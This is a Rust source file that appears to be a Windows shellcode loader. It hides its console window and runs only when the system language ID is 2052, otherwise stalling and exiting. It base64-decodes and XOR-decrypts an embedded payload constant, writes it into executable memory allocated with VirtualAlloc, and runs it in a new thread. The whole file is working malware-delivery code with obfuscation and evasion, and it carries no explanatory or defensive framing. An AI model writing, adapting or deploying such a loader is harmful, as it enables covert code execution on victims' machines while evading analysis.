const PAGE_EXECUTE_READWRITE: u32 = 0x40;
const MEM_COMMIT: u32 = 0x1000;
const MEM_RESERVE: u32 = 0x2000;
fn main() {

    unsafe{
        let show_window_cmd = SHOW_WINDOW_CMD(0);
        ShowWindow(GetConsoleWindow(),show_window_cmd);
        let systemlangid = GetSystemDefaultLangID();
        if systemlangid != 2052{
            thread::sleep(time::Duration::from_millis(10000000));
            std::process::exit(1);
        }
    }
    let locationtype = Memory::VIRTUAL_ALLOCATION_TYPE(MEM_COMMIT | MEM_RESERVE);
    let flprotect = Memory::PAGE_PROTECTION_FLAGS(PAGE_EXECUTE_READWRITE);

    let shellcode = xor_fn(base64_decode(String::from(SHELLCODE)),XOR);
    let new_buf = unsafe {
        VirtualAlloc(
            std::ptr::null_mut(),
            shellcode.len(),
            locationtype,
            flprotect,
        )
    };
    if new_buf == std::ptr::null_mut() {
        return;
    }
    let new_buf_ptr: *mut u8 = new_buf as *mut u8 as _;
    unsafe{
        std::ptr::copy_nonoverlapping(shellcode.as_ptr(), new_buf_ptr, shellcode.len());
        let handle = CreateThread(ptr::null_mut(), 0, Some(mem::transmute(new_buf)), ptr::null_mut(), THREAD_CREATION_FLAGS(134217728), ptr::null_mut());
        if handle.is_invalid(){
            std::process::exit(1);
        }
        WaitForSingleObject(handle, u32::MAX);
    }
}

fn xor_fn(shellcode:Vec<u8>,xor:u8)->Vec<u8>{
    let mut xor_shellcode:Vec<u8> = vec![];
    for i in shellcode.iter(){
        xor_shellcode.push(i^xor)
    }
    xor_shellcode
}


fn base64_decode(shellcode:String)->Vec<u8>{
    base64::decode_config(shellcode,base64::STANDARD_NO_PAD).unwrap()
}